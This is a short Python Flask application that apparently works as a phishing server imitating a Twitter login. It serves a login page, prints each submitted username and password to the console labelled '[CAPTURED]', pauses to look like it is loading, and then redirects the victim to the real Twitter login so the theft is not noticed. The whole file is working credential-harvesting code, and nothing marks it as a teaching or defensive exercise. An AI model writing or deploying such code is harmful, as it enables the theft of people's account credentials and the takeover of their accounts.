from flask import Flask, render_template, request, redirect
import time

app = Flask(__name__)

@app.route('/')
def home():
    return render_template('login.html')

@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']
    print(f"[CAPTURED] Username: {username}, Password: {password}")
    time.sleep(2)  # Simulate loading
    return redirect("https://twitter.com/login")  # Fake redirect

if __name__ == '__main__':
    app.run(debug=True)
